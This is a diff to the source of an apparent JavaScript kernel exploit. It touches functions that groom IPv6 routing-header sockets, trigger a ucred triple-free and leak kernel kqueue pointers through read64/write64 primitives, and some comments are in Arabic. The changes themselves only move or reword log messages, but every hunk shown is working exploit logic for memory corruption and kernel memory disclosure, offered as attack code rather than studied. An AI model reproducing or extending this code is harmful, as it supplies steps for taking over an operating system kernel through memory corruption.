@@ -803,7 +803,7 @@ function find_twins() {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log('GLITCH : [' + i + '] [' + j + ']');
+        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -943,14 +943,12 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-  log('Leaking .....');
+  
   var leak_ok = leak_kqueue_safe();
   if (!leak_ok) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  log('Leaking done .....');
 
   yield_to_render(exploit_phase_rw);
 }
@@ -1324,6 +1322,7 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+    log('Triple Free Running...');
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
@@ -1387,6 +1386,7 @@ function trigger_ucred_triplefree() {
 }
 function leak_kqueue() {
   debug('Leaking kqueue...');
+  log('Leaking .....');
 
   // 1) صفّر الذاكرة مرة واحدة فقط
   write64(leak_rthdr.add(0x08), 0);
@@ -1425,6 +1425,7 @@ function leak_kqueue() {
     kq_fdp = fdp;
     kl_lock = read64(leak_rthdr.add(0x60));
     close(kq);
+    log('Leaking done .....');
     return true;
   }
   return false;
